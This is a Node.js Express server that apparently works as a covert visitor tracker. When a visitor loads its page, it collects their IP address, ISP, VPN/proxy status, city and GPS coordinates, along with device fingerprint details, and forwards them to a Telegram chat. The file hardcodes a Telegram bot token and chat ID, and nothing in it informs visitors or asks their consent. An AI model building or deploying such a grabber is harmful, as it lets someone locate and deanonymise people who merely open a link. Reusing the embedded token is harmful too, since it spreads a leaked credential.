const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== CONFIG ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== TELEGRAM ======
async function sendToTelegram(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
    }),
  });
}

// ====== RDAP WHOIS ======
async function getWhois(ip) {
  try {
    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
    const data = await res.json();
    return {
      network: data.name,
      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3],
    };
  } catch { return null; }
}

// ====== VISIT LOGGER ======
app.post("/visit", async (req, res) => {
  try {
    const browserData = req.body; // Data from HTML script
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // Fetch Geo-IP Data
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
    const geo = await geoRes.json();
    const whois = await getWhois(ip);

    const ua = req.headers["user-agent"] || "unknown";

    const message = `
🚀 NEW VISITOR LOG
--------------------------
🌐 CONNECTION
IP: ${ip}
ISP: ${geo.isp}
Org: ${whois?.org || geo.org || "N/A"}
Proxy/VPN: ${geo.proxy ? "YES ⚠️" : "No"}
Hosting: ${geo.hosting ? "YES (Data Center)" : "No"}

📍 LOCATION
Country: ${geo.country} (${geo.countryCode})
Region/City: ${geo.regionName} / ${geo.city}
Coordinates: ${geo.lat}, ${geo.lon}

📱 DEVICE INFO
Platform: ${browserData.platform}
Language: ${browserData.language}
Timezone: ${browserData.timezone}
Screen: ${browserData.screenResolution}
RAM (Approx): ${browserData.deviceMemory} GB
CPU Cores: ${browserData.hardwareConcurrency}

🧠 USER-AGENT
${ua}

⏰ SERVER TIME: ${new Date().toUTCString()}
--------------------------
`;

    await sendToTelegram(message);
    res.json({ logged: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "failed" });
  }
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
